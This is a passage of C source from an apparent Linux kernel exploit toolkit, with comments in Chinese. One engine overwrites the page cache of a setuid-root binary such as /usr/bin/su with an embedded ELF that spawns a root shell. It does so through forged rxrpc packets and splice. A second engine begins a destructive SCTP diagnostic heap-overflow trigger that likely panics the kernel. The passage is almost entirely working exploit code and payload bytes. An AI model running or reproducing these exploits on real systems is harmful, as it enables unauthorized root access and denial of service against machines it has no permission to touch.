        struct sockaddr_in  sin;
        struct sockaddr_in6 sin6;
    } transport;
};

#define DC31635_PKT_DATA        1
#define DC31635_PKT_CHALLENGE   6
#define DC31635_LAST_PACKET     0x04

/* 120 字节的 tiny ELF：setuid(0) → setgid(0) → setgroups(0) → execve("/bin/sh")。
   ET_DYN + 整文件映射，入口 0x68，正好落在段内。 */
static const uint8_t dc31635_elf[DC31635_PAYLOAD_LEN] = {
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x03,0x00,0x3e,0x00,0x01,0x00,0x00,0x00, 0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x38,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00, 0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00, 0x78,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x78,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0xb0,0x69,0x0f,0x05,
    0x48,0x8d,0x3d,0xdd,0xff,0xff,0xff,
    0x6a,0x3b,0x58,
    0x0f,0x05,
};

/* --- rxgk token 的 XDR 拼装 --- */
static void dc31635_put32(uint8_t **pp, uint32_t v)
{
    uint32_t nv = htonl(v);

    memcpy(*pp, &nv, 4);
    *pp += 4;
}

static void dc31635_put64(uint8_t **pp, uint64_t v)
{
    dc31635_put32(pp, (uint32_t)(v >> 32));
    dc31635_put32(pp, (uint32_t)(v & 0xFFFFFFFFu));
}

static void dc31635_put_data(uint8_t **pp, const void *data, size_t len)
{
    size_t pad;

    dc31635_put32(pp, (uint32_t)len);
    memcpy(*pp, data, len);
    *pp += len;
    pad = (4 - (len & 3)) & 3;
    if (pad) {
        memset(*pp, 0, pad);
        *pp += pad;
    }
}

static int dc31635_build_token(uint8_t *out, size_t maxlen,
                               const uint8_t *base_key, size_t keylen)
{
    uint8_t tok[512];
    uint8_t *p = out, *tp = tok;
    uint8_t ticket[8] = { 0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE };
    struct timespec ts;
    uint64_t now;
    size_t toklen;

    clock_gettime(CLOCK_REALTIME, &ts);
    now = (uint64_t)ts.tv_sec * 10000000ULL + (uint64_t)ts.tv_nsec / 100ULL;

    dc31635_put32(&p, 0);                       /* flags */
    dc31635_put_data(&p, "poc.test", 8);        /* cell  */
    dc31635_put32(&p, 1);                       /* ntoken */

    dc31635_put32(&tp, DC31635_SEC_INDEX);
    dc31635_put64(&tp, now);                    /* begintime */
    dc31635_put64(&tp, now + 864000000000ULL);  /* endtime   */
    dc31635_put64(&tp, 2);                      /* level = ENCRYPT */
    dc31635_put64(&tp, 864000000000ULL);        /* lifetime  */
    dc31635_put64(&tp, 0);                      /* bytelife  */
    dc31635_put64(&tp, DC31635_ENCTYPE);        /* enctype   */
    dc31635_put_data(&tp, base_key, keylen);    /* key       */
    dc31635_put_data(&tp, ticket, sizeof(ticket));

    toklen = (size_t)(tp - tok);
    dc31635_put32(&p, (uint32_t)toklen);
    memcpy(p, tok, toklen);
    p += toklen;

    if ((size_t)(p - out) > maxlen)
        return -1;
    return (int)(p - out);
}

static long dc31635_add_key(const char *desc, const uint8_t *base_key, size_t keylen)
{
    uint8_t buf[1024];
    int n = dc31635_build_token(buf, sizeof(buf), base_key, keylen);

    if (n < 0)
        return -1;
    return syscall(SYS_add_key, "rxrpc", desc, buf, (size_t)n,
                   DC31635_KEYRING_PROCESS);
}

static void dc31635_drop_key(long key)
{
    if (key < 0)
        return;
    syscall(SYS_keyctl, KEYCTL_UNLINK, key, DC31635_KEYRING_PROCESS);
    syscall(SYS_keyctl, KEYCTL_INVALIDATE, key);
}

/* userns + netns + lo up：和 43503 要的东西一模一样，直接复用那份实现 */
static int dc31635_setup_ns(void)
{
    return dc43503_setup_ns();
}

static int dc31635_udp_server(uint16_t port)
{
    struct sockaddr_in sa;
    int one = 1;
    int s = socket(AF_INET, SOCK_DGRAM, 0);

    if (s < 0)
        return -1;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = htonl(0x7F000001);
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(s);
        return -1;
    }
    return s;
}

static ssize_t dc31635_udp_recv(int s, void *buf, size_t cap,
                                struct sockaddr_in *from, int timeout_ms)
{
    struct pollfd pfd;
    socklen_t fl = (socklen_t)sizeof(*from);

    pfd.fd = s;
    pfd.events = POLLIN;
    pfd.revents = 0;
    if (poll(&pfd, 1, timeout_ms) <= 0)
        return -1;
    return recvfrom(s, buf, cap, 0, (struct sockaddr *)from,
                    from ? &fl : NULL);
}

static int dc31635_rxrpc_client(uint16_t local_port, const char *keyname)
{
    struct dc31635_srx srx;
    int min_level = DC31635_MAX_LEVEL;
    int fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);

    if (fd < 0)
        return -1;
    if (setsockopt(fd, SOL_RXRPC, DC31635_OPT_SEC_KEY,
                   keyname, strlen(keyname)) < 0) {
        close(fd);
        return -1;
    }
    if (setsockopt(fd, SOL_RXRPC, DC31635_OPT_MIN_LEVEL,
                   &min_level, sizeof(min_level)) < 0) {
        close(fd);
        return -1;
    }

    memset(&srx, 0, sizeof(srx));
    srx.srx_family = AF_RXRPC;
    srx.srx_service = 0;
    srx.transport_type = SOCK_DGRAM;
    srx.transport_len = (uint16_t)sizeof(struct sockaddr_in);
    srx.transport.sin.sin_family = AF_INET;
    srx.transport.sin.sin_port = htons(local_port);
    srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);

    if (bind(fd, (struct sockaddr *)&srx, sizeof(srx)) < 0) {
        close(fd);
        return -1;
    }
    return fd;
}

static int dc31635_initiate(int cli_fd, uint16_t srv_port, uint16_t service_id)
{
    char data[] = "TESTDATA";
    struct dc31635_srx srx;
    char cmsg_buf[CMSG_SPACE(sizeof(unsigned long))];
    struct msghdr msg;
    struct iovec iov;
    struct cmsghdr *cmsg;
    int fl, n;

    memset(&srx, 0, sizeof(srx));
    srx.srx_family = AF_RXRPC;
    srx.srx_service = service_id;
    srx.transport_type = SOCK_DGRAM;
    srx.transport_len = (uint16_t)sizeof(struct sockaddr_in);
    srx.transport.sin.sin_family = AF_INET;
    srx.transport.sin.sin_port = htons(srv_port);
    srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);

    memset(&msg, 0, sizeof(msg));
    msg.msg_name = &srx;
    msg.msg_namelen = (socklen_t)sizeof(srx);
    iov.iov_base = data;
    iov.iov_len = sizeof(data);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);
    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_RXRPC;
    cmsg->cmsg_type = DC31635_OPT_USER_CALL;
    cmsg->cmsg_len = CMSG_LEN(sizeof(unsigned long));
    *(unsigned long *)CMSG_DATA(cmsg) = 0xDEAD;

    fl = fcntl(cli_fd, F_GETFL);
    fcntl(cli_fd, F_SETFL, fl | O_NONBLOCK);
    n = (int)sendmsg(cli_fd, &msg, 0);
    fcntl(cli_fd, F_SETFL, fl);

    if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK)
        return -1;
    return 0;
}

/* 一次 fire：随机 key 建 SA → 起 UDP 假服务端 → 客户端发起 call → 收 challenge
   → 把"文件页 + 伪造 DATA 头"拼进 pipe 发给内核。命中与否由调用方回读 map 判断 */
static int dc31635_fire(int target_fd, off_t splice_off, size_t splice_len,
                        const uint8_t *key, size_t keylen)
{
    static int seq;
    char keyname[32];
    struct dc31635_wire_hdr mal;
    struct dc31635_wire_hdr *hdr;
    struct sockaddr_in cli_addr, to, dst;
    uint8_t pkt[2048];
    uint8_t ch[sizeof(struct dc31635_wire_hdr) + 20];
    struct dc31635_wire_hdr *c;
    struct iovec viv;
    uint32_t epoch, cid, callN;
    uint16_t svc, cport;
    int p[2], udp_srv, cli, ret = -1, i;
    long k;
    ssize_t n;

    snprintf(keyname, sizeof(keyname), "rxgk%d", seq++);
    k = dc31635_add_key(keyname, key, keylen);
    if (k < 0)
        return -1;

    {
        uint16_t port_s = (uint16_t)(10000 + (rand() % 27000) * 2);

        udp_srv = dc31635_udp_server(port_s);
        if (udp_srv < 0)
            goto out_key;
        cli = dc31635_rxrpc_client((uint16_t)(port_s + 1), keyname);
        if (cli < 0)
            goto out_udp;
        if (dc31635_initiate(cli, port_s, 1234) < 0)
            goto out_cli;
    }

    n = dc31635_udp_recv(udp_srv, pkt, sizeof(pkt), &cli_addr, 50);
    if (n < (ssize_t)sizeof(struct dc31635_wire_hdr))
        goto out_cli;

    hdr = (struct dc31635_wire_hdr *)pkt;
    epoch = ntohl(hdr->epoch);
    cid   = ntohl(hdr->cid);
    callN = ntohl(hdr->callNumber);
    svc   = ntohs(hdr->serviceId);
    cport = ntohs(cli_addr.sin_port);

    /* challenge */
    memset(ch, 0, sizeof(ch));
    c = (struct dc31635_wire_hdr *)ch;
    c->epoch = htonl(epoch);
    c->cid = htonl(cid);
    c->serial = htonl(0x10000);
    c->type = DC31635_PKT_CHALLENGE;
    c->securityIndex = DC31635_SEC_INDEX;
    c->serviceId = htons(svc);
    for (i = 0; i < 20; i++)
        ch[sizeof(struct dc31635_wire_hdr) + i] = (uint8_t)(rand() & 0xFF);

    memset(&to, 0, sizeof(to));
    to.sin_family = AF_INET;
    to.sin_port = htons(cport);
    to.sin_addr.s_addr = htonl(0x7F000001);
    sendto(udp_srv, ch, sizeof(ch), 0, (struct sockaddr *)&to, sizeof(to));

    for (i = 0; i < 3; i++) {
        struct sockaddr_in src;

        if (dc31635_udp_recv(udp_srv, pkt, sizeof(pkt), &src, 5) < 0)
            break;
    }

    /* 伪造 DATA：header 走 vmsplice，正文由 splice 直接从目标文件页拉进来 */
    memset(&mal, 0, sizeof(mal));
    mal.epoch = htonl(epoch);
    mal.cid = htonl(cid);
    mal.callNumber = htonl(callN);
    mal.seq = htonl(1);
    mal.serial = htonl(0x42000);
    mal.type = DC31635_PKT_DATA;
    mal.flags = DC31635_LAST_PACKET;
    mal.securityIndex = DC31635_SEC_INDEX;
    mal.serviceId = htons(svc);

    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(cport);
    dst.sin_addr.s_addr = htonl(0x7F000001);
    if (connect(udp_srv, (struct sockaddr *)&dst, sizeof(dst)) < 0)
        goto out_cli;

    if (pipe(p) < 0)
        goto out_cli;

    viv.iov_base = &mal;
    viv.iov_len = sizeof(mal);
    if (vmsplice(p[1], &viv, 1, 0) < 0) {
        close(p[0]);
        close(p[1]);
        goto out_cli;
    }
    {
        loff_t off = (loff_t)splice_off;

        if (splice(target_fd, &off, p[1], NULL, splice_len,
                   SPLICE_F_NONBLOCK) < 0) {
            close(p[0]);
            close(p[1]);
            goto out_cli;
        }
    }
    if (splice(p[0], NULL, udp_srv, NULL, sizeof(mal) + splice_len, 0) < 0) {
        close(p[0]);
        close(p[1]);
        goto out_cli;
    }
    close(p[0]);
    close(p[1]);

    usleep(1000);

    /* 把 call 上的错误回收掉，否则下一次 add_key 会撞上残留状态 */
    {
        int fl = fcntl(cli, F_GETFL);

        fcntl(cli, F_SETFL, fl | O_NONBLOCK);
        for (i = 0; i < 2; i++) {
            char rb[2048], ccb[256];
            struct dc31635_srx srx;
            struct msghdr m;
            struct iovec iv;

            memset(&m, 0, sizeof(m));
            memset(&srx, 0, sizeof(srx));
            iv.iov_base = rb;
            iv.iov_len = sizeof(rb);
            m.msg_name = &srx;
            m.msg_namelen = (socklen_t)sizeof(srx);
            m.msg_iov = &iv;
            m.msg_iovlen = 1;
            m.msg_control = ccb;
            m.msg_controllen = sizeof(ccb);
            recvmsg(cli, &m, 0);
        }
    }
    dc31635_fires++;
    ret = 1;

out_cli:
    close(cli);
out_udp:
    close(udp_srv);
out_key:
    dc31635_drop_key(k);
    return ret;
}

/* -check 用：把 fire() 走到握手那一步就停，不 splice、不碰目标页 */
static int dc31635_probe(void)
{
    uint8_t key[DC31635_AES_KEY_LEN];
    uint8_t pkt[2048];
    struct sockaddr_in from;
    char keyname[32];
    uint16_t base;
    int udp = -1, cli = -1, ok = 0;
    long k;

    memset(key, 0, sizeof(key));
    snprintf(keyname, sizeof(keyname), "rxgkprobe%d", (int)getpid());
    k = dc31635_add_key(keyname, key, sizeof(key));
    if (k < 0) {
        fprintf(stderr, "[-] add_key(rxrpc/rxgk) 失败: %s\n"
                        "    内核没编 CONFIG_RXGK，或 rxgk 安全类不可用\n",
                strerror(errno));
        return -1;
    }

    base = (uint16_t)(20000 + (getpid() % 20000));
    udp = dc31635_udp_server(base);
    if (udp < 0) {
        fprintf(stderr, "[-] udp bind %u 失败: %s\n", (unsigned)base,
                strerror(errno));
        goto out;
    }
    cli = dc31635_rxrpc_client((uint16_t)(base + 1), keyname);
    if (cli < 0) {
        fprintf(stderr, "[-] AF_RXRPC 建链失败: %s\n    需要 CONFIG_AF_RXRPC\n",
                strerror(errno));
        goto out;
    }
    if (dc31635_initiate(cli, base, 1234) < 0) {
        fprintf(stderr, "[-] sendmsg(AF_RXRPC) 失败: %s\n", strerror(errno));
        goto out;
    }
    if (dc31635_udp_recv(udp, pkt, sizeof(pkt), &from, 100) > 0)
        ok = 1;
    else
        fprintf(stderr, "[-] 没收到 rxrpc 首包（端口 %u）\n", (unsigned)base);

out:
    if (cli >= 0)
        close(cli);
    if (udp >= 0)
        close(udp);
    dc31635_drop_key(k);
    return ok ? 0 : -1;
}

static int dc31635_gate(void)
{
    struct stat st;
    int fd;

    if (stat(dc31635_target, &st) < 0) {
        fprintf(stderr, "gate_failed: stat %s: %s\n", dc31635_target,
                strerror(errno));
        return 2;
    }
    if (!S_ISREG(st.st_mode)) {
        fprintf(stderr, "gate_failed: 不是普通文件\n");
        return 2;
    }
    if (st.st_size < DC31635_MIN_LEN) {
        fprintf(stderr, "gate_failed: 文件太小 size=%lld need>=%d\n",
                (long long)st.st_size, DC31635_MIN_LEN);
        return 2;
    }
    if (st.st_uid != 0 || !(st.st_mode & S_ISUID)) {
        fprintf(stderr, "gate_failed: 不是 setuid root 文件 (uid=%u mode=%o)\n",
                (unsigned)st.st_uid, (unsigned)(st.st_mode & 07777));
        return 2;
    }
    if (access(dc31635_target, R_OK) != 0) {
        fprintf(stderr, "gate_failed: 当前用户读不了它 (%s)\n", strerror(errno));
        return 2;
    }
    if (dc_mount_nosuid(dc31635_target)) {
        fprintf(stderr, "gate_failed: 目标在 nosuid 挂载上\n");
        return 2;
    }
    errno = 0;
    fd = open(dc31635_target, O_WRONLY | O_CLOEXEC);
    if (fd >= 0) {
        close(fd);
        printf("gate_failed: 外层 write-open 意外成功（你是 root？）\n");
        return 4;
    }
    printf("gate_ok: %s size=%lld uid=0 setuid=1 outer_write_open_denied=1\n",
           dc31635_target, (long long)st.st_size);
    return 0;
}

/* 逐字节暴力猜。每次 fire 换随机 key，命中判据是 mmap 出来的页里那个字节 */
static int dc31635_write_payload(int rfd, const void *map, off_t file_size)
{
    const uint8_t *m = map;
    struct timespec t0, t1;
    uint8_t key[DC31635_AES_KEY_LEN];
    uint64_t seed = (uint64_t)time(NULL) * 0x100000001ULL ^ (uint64_t)getpid();
    double dt;
    int i, start = 0, need, bad = 0;

    for (i = 0; i < DC31635_PAYLOAD_LEN; i++) {
        uint8_t cur = 0;

        if (pread(rfd, &cur, 1, i) != 1) {
            fprintf(stderr, "[-] 读目标失败: %s\n", strerror(errno));
            return -1;
        }
        if (cur != dc31635_elf[i]) {
            start = i;
            break;
        }
        if (i == DC31635_PAYLOAD_LEN - 1) {
            printf("[*] 页缓存内容已经一致, 不需要写\n");
            return 0;
        }
    }

    need = DC31635_PAYLOAD_LEN - start;
    printf("[*] 开始写 %d 字节, 从偏移 %d 起（逐字节猜, 每字节最多 %d 次）\n",
           need, start, DC31635_MAX_TRIES);

    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (i = start; i < DC31635_PAYLOAD_LEN; i++) {
        uint8_t want = dc31635_elf[i];
        uint8_t cur = 0;
        int ok = 0, att;

        if (pread(rfd, &cur, 1, i) == 1 && cur == want && i > start)
            continue;

        for (att = 0; att < DC31635_MAX_TRIES && !ok; att++) {
            size_t slen = 28;

            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            {
                uint64_t r = seed;

                seed ^= seed << 13;
                seed ^= seed >> 7;
                seed ^= seed << 17;
                memcpy(key, &r, 8);
                memcpy(key + 8, &seed, 8);
            }

            if ((off_t)i + (off_t)slen > file_size)
                slen = (size_t)(file_size - (off_t)i);
            if (slen < 16)
                slen = 16;
            if (slen > 28)
                slen = 28;

            if (dc31635_fire(rfd, (off_t)i, slen, key, sizeof(key)) == 1 &&
                m[i] == want)
                ok = 1;
        }
        if (!ok) {
            fprintf(stderr, "[-] 第 %d/%d 字节没写进去（试了 %d 次）\n",
                    i + 1, DC31635_PAYLOAD_LEN, DC31635_MAX_TRIES);
            return -1;
        }
        if (dc31635_verbose || (i - start + 1) % 8 == 0 ||
            i == DC31635_PAYLOAD_LEN - 1) {
            clock_gettime(CLOCK_MONOTONIC, &t1);
            dt = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
            if (dt < 0.000001)
                dt = 0.000001;
            printf("[*] %3d/%d 字节  fires=%d  %.1fs  %.0f 次/秒\n",
                   i - start + 1, need, dc31635_fires, dt,
                   dc31635_fires / dt);
        }
    }

    for (i = 0; i < DC31635_PAYLOAD_LEN; i++) {
        uint8_t cur = 0;

        if (pread(rfd, &cur, 1, i) != 1 || cur != dc31635_elf[i])
            bad++;
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    dt = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
    printf("[+] bytes_flip_summary len=%d mismatch=%d fires=%d %.1fs\n",
           DC31635_PAYLOAD_LEN, bad, dc31635_fires, dt);
    return bad == 0 ? 0 : -1;
}

/* 写之前先备份：页缓存脏页 5 秒后就会回写，出错时只能靠这份副本 + 重装包 */
static int dc31635_backup(const char *path, char *out, size_t outlen)
{
    const char *base = strrchr(path, '/');
    char buf[4096];
    ssize_t n;
    int src, dst;

    base = base ? base + 1 : path;
    snprintf(out, outlen, "/tmp/.%s.%d", base, (int)getpid());

    src = open(path, O_RDONLY | O_CLOEXEC);
    if (src < 0)
        return -1;
    dst = open(out, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
    if (dst < 0) {
        close(src);
        return -1;
    }
    while ((n = read(src, buf, sizeof(buf))) > 0)
        if (write(dst, buf, (size_t)n) != n)
            break;
    close(src);
    close(dst);
    return 0;
}

static void dc31635_usage(const char *prog)
{
    fprintf(stderr,
        "usage: %s -start|-test|-check|-find [-t target] [-v]\n"
        "  -check   只探测 userns/netns + AF_RXRPC + rxgk key, 不写任何文件\n"
        "  -test    写 120 字节到目标页缓存并回读校验, 不 exec\n"
        "  -start   写成功后 exec 目标\n"
        "  -find    只列 setuid root 候选靶子, 不碰 userns/AF_RXRPC\n"
        "  -t       目标文件, 默认 /usr/bin/su；需 setuid root、>= 4096 字节、\n"
        "           对当前用户可读但不可写\n", prog);
}

int cve31635_main(int argc, char **argv)
{
    int mode = -1;              /* -1 未指定 / 0 start / 1 test / 2 check / 3 find */
    char backup[256] = "";
    struct stat st;
    off_t file_size;
    void *map;
    int i, rfd, rc, status = 0;
    pid_t pid;

    for (i = 1; i < argc; i++) {
        const char *s = argv[i];

        if (!strcmp(s, "-start"))
            mode = 0;
        else if (!strcmp(s, "-test"))
            mode = 1;
        else if (!strcmp(s, "-check"))
            mode = 2;
        else if (!strcmp(s, "-find"))
            mode = 3;
        else if (!strcmp(s, "-t") && i + 1 < argc)
            dc31635_target = argv[++i];
        else if (!strcmp(s, "-v") || !strcmp(s, "--verbose"))
            dc31635_verbose = 1;
        else if (!strcmp(s, "-h") || !strcmp(s, "--help")) {
            dc31635_usage("dirtychains");
            return 2;
        } else if (s[0] == '-' && s[1]) {
            fprintf(stderr, "cve31635: 未知参数 %s\n", s);
            return 2;
        }
    }
    if (getenv("DIRTYFRAG_VERBOSE"))
        dc31635_verbose = 1;

    if (mode < 0) {
        fprintf(stderr, "cve31635: 必须显式指定 -check / -test / -start / -find\n");
        dc31635_usage("dirtychains");
        return 2;
    }
    if (mode == 3)
        return dc_scan_setuid();

    srand((unsigned)time(NULL) ^ (unsigned)getpid());

    printf("[*] uid=%d euid=%d target=%s\n",
           (int)getuid(), (int)geteuid(), dc31635_target);

    rc = dc31635_gate();
    if (rc)
        return rc;

    if (mode == 2) {
        pid = fork();
        if (pid < 0) {
            fprintf(stderr, "fork: %s\n", strerror(errno));
            return 1;
        }
        if (pid == 0) {
            if (dc31635_setup_ns() < 0)
                _exit(4);
            _exit(dc31635_probe() == 0 ? 0 : 4);
        }
        if (waitpid(pid, &status, 0) < 0)
            return 1;
        if (!WIFEXITED(status))
            return 1;
        printf("%s", WEXITSTATUS(status) == 0
               ? "[+] 前置条件齐备: userns/netns + AF_RXRPC + rxgk key 均可用\n"
               : "[-] 前置条件不满足\n");
        return WEXITSTATUS(status);
    }

    rfd = open(dc31635_target, O_RDONLY | O_CLOEXEC);
    if (rfd < 0) {
        fprintf(stderr, "open %s: %s\n", dc31635_target, strerror(errno));
        return 1;
    }
    if (fstat(rfd, &st) < 0) {
        close(rfd);
        return 1;
    }
    file_size = st.st_size;

    map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rfd, 0);
    if (map == MAP_FAILED) {
        fprintf(stderr, "mmap: %s\n", strerror(errno));
        close(rfd);
        return 1;
    }

    if (dc31635_backup(dc31635_target, backup, sizeof(backup)) == 0)
        printf("[*] 原文件已备份: %s\n    恢复: cp %s %s\n",
               backup, backup, dc31635_target);
    else
        printf("[!] 备份失败（%s），出问题只能重装包恢复\n", strerror(errno));

    pid = fork();
    if (pid < 0) {
        fprintf(stderr, "fork: %s\n", strerror(errno));
        munmap(map, 4096);
        close(rfd);
        return 1;
    }
    if (pid == 0) {
        /* 子进程进 userns/netns 干活；父进程留在外层，成功后才能 exec 出真 root */
        if (dc31635_setup_ns() < 0)
            _exit(4);
        _exit(dc31635_write_payload(rfd, map, file_size) == 0 ? 0 : 1);
    }

    if (waitpid(pid, &status, 0) < 0) {
        munmap(map, 4096);
        close(rfd);
        return 1;
    }
    munmap(map, 4096);
    close(rfd);

    if (!WIFEXITED(status)) {
        printf("[-] 子进程被信号终止\n");
        return 1;
    }
    rc = WEXITSTATUS(status);
    if (rc != 0) {
        printf("%s", rc == 4 ? "[-] 前置条件不满足（userns 被禁？）\n"
                             : "[-] 写原语失败, 没打成\n");
        if (backup[0])
            printf("[*] 目标可能已被部分改写, 恢复: cp %s %s\n",
                   backup, dc31635_target);
        return rc;
    }

    printf("[+] 目标前 %d 字节已改写（页缓存，未落盘）\n", DC31635_PAYLOAD_LEN);

    if (mode == 0) {
        printf("[*] exec %s\n", dc31635_target);
        fflush(NULL);
        execl(dc31635_target, dc31635_target, (char *)NULL);
        fprintf(stderr, "exec %s: %s\n", dc31635_target, strerror(errno));
        return 1;
    }
    return 0;
}

/* ===========================================================================
 * DiagSpill 引擎: CVE-2026-74469（入口 diagspill_main）
 *
 * 根因: sctp_assoc_add_peer() 给每个新增唯一对端把 16 位 transport_count +1,
 *       加到第 65536 个时回绕成 0。sctp_diag 的 INET_DIAG_PEERS dump 用
 *       transport_count 预留应答 payload, 却按 transport_addr_list 的真实长度
 *       (81920) 逐条拷贝 sockaddr_storage(128 字节), 于是写出约 10MB, 越过
 *       skb 尾进入相邻堆 —— CWE-787 堆越界写。
 *
 * 公开 exploit(Asim Manizada, 2026-09-18) 的完整 LPE 是: 2048 个 worker + 页表
 *       蓄水池 + 大页饱和, 把越界写精确落在 PMD 上, 篡改页表把物理内存映射成
 *       用户可读写, 扫到 cred 后改 UID/GID, 再借 sudo 提权。这套锁死在
 *       6.17/6.19 + 严格 4 vCPU/4GB + 透明大页, 且一触发就破坏 ~8MB 内核内存、
 *       大概率 panic、需重启。此处只接"安全检测"和"破坏性触发器", 用作漏洞
 *       存在性证明 / DoS 演示。完整 LPE 见 README, 需在对应内核上单独调参。
 *
 * 退出码: 0 = 成功 / 看起来未修复   1 = 没打成 / 已修复
 *         2 = 用法错   3 = 环境不可用(SCTP/sctp_diag 缺失)   4 = 其它前置
 * ========================================================================= */

#ifndef IPPROTO_SCTP
#define IPPROTO_SCTP 132
#endif
#ifndef SOL_SCTP
#define SOL_SCTP 132
#endif
#define DS_SCTP_SOCKOPT_CONNECTX3 111
#define DS_NETLINK_SOCK_DIAG 4

#define DS_SAFE_PEERS 16384U
#define DS_OVERFLOW_PEERS (65536U + DS_SAFE_PEERS)   /* 81920 */

struct ds_connectx_parameter {
    int32_t assoc_id;
    int32_t addr_num;
    struct sockaddr *addrs;
};

static void ds_usage(void)
{
    fprintf(stderr,
        "用法: dirtychains --diagspill <模式> [选项]\n"
        "  -check   只读检测: SCTP/sctp_diag 可用 + 内核版本是否低于修复版\n"
        "  -test    破坏性: 建 81920 对端关联并触发 sctp_diag 越界写(需 -force)\n"
        "  -start   同 -test(破坏性触发器, 需 -force)\n"
        "  -find    此漏洞无需 setuid 靶子, 跳过扫描\n"
        "  -force   确认破坏性操作\n"
        "  -h       帮助\n"
        "\n"
        "  注意: -test/-start 会写出约 10MB 堆越界, 破坏内核内存, 大概率 panic,\n"
        "  需重启。完整 LPE(改 cred 提权)在 6.17/6.19 + 4 vCPU/4GB 上才成立,\n"
        "  此处不含。仅用于漏洞存在性证明 / DoS 演示。\n");
}

static uint64_t ds_splitmix64(uint64_t value)
{
    value += 0x9e3779b97f4a7c15ULL;
    value = (value ^ (value >> 30)) * 0xbf58476d1ce4e5b9ULL;
    value = (value ^ (value >> 27)) * 0x94d049bb133111ebULL;
    return value ^ (value >> 31);
}

static struct sockaddr_in6 *ds_make_peers(uint16_t port, unsigned int count)
{
    struct sockaddr_in6 *peers = calloc(count, sizeof(*peers));

    if (!peers)
        return NULL;
    for (uint32_t i = 0; i < count; i++) {
        /* 唯一地址即可让 transport_count 递增; 这里沿用公开 exploit 的
         * "按 peer 索引散列" 方案, 对触发器无害。 */
        uint64_t a = ds_splitmix64((uint64_t)i * 0x9e3779b97f4a7c15ULL +
                                   5057595369945519184ULL);
        peers[i].sin6_family = AF_INET6;
        peers[i].sin6_port = htons(port);
        memcpy((unsigned char *)&peers[i].sin6_addr, &a, sizeof(a));
    }
    return peers;
}

static int ds_connectx_many(int fd, struct sockaddr_in6 *peers,
                            unsigned int count)
{
    struct sctp_initmsg init = {
        .sinit_max_attempts = 255,
        .sinit_max_init_timeo = 60000,
    };
    struct ds_connectx_parameter param = {
        .addr_num = (int32_t)((size_t)count * sizeof(*peers)),
        .addrs = (struct sockaddr *)peers,
    };
    socklen_t olen = sizeof(param);
    int r, e;

    if (setsockopt(fd, IPPROTO_SCTP, SCTP_INITMSG, &init, sizeof(init)) < 0)
        return -1;
    errno = 0;
    r = getsockopt(fd, SOL_SCTP, DS_SCTP_SOCKOPT_CONNECTX3, &param, &olen);
    e = errno;
    printf("SCTP 关联对端数(已加): %u\n", count);
    printf("16 位 transport_count 截断后: %u\n", count & 0xFFFF);
    printf("SCTP 关联建立: %s (assoc_id=%d)\n",
           r == 0 ? "完成" : (e == EINPROGRESS ? "进行中(预期)" :
                              strerror(e)),
           param.assoc_id);
    return (r == 0 || e == EINPROGRESS) ? 0 : -1;
}

static int ds_prepare_diag(int sctp_fd, const struct sockaddr_in6 *peer,
                           int *nl_out)
{
    struct {
        struct nlmsghdr nlh;
        struct inet_diag_req_v2 req;
    } msg;
    struct sockaddr_in6 local;
    socklen_t ll = sizeof(local);
    int nl = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, DS_NETLINK_SOCK_DIAG);

    if (nl < 0)
        return -1;
    if (getsockname(sctp_fd, (struct sockaddr *)&local, &ll) < 0) {
        close(nl);
        return -1;
    }
    memset(&msg, 0, sizeof(msg));
    msg.nlh.nlmsg_len = sizeof(msg);
    msg.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
    msg.nlh.nlmsg_flags = NLM_F_REQUEST;
    msg.nlh.nlmsg_seq = 0x1001;
    msg.req.sdiag_family = AF_INET6;
    msg.req.sdiag_protocol = IPPROTO_SCTP;
    msg.req.idiag_states = 0xFFFFFFFFu;
    msg.req.id.idiag_sport = local.sin6_port;
    msg.req.id.idiag_dport = peer->sin6_port;
    memcpy(msg.req.id.idiag_src, &local.sin6_addr, sizeof(local.sin6_addr));
    memcpy(msg.req.id.idiag_dst, &peer->sin6_addr, sizeof(peer->sin6_addr));
    msg.req.id.idiag_cookie[0] = INET_DIAG_NOCOOKIE;
    msg.req.id.idiag_cookie[1] = INET_DIAG_NOCOOKIE;
    *nl_out = nl;
    return send(nl, &msg, sizeof(msg), 0) == (ssize_t)sizeof(msg) ? 0 : -1;
}

/* 安全检测: 不建对端、不触发, 只验证前提并给出内核版本结论 */
static int ds_check(void)
{
    int sctp_fd = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, IPPROTO_SCTP);
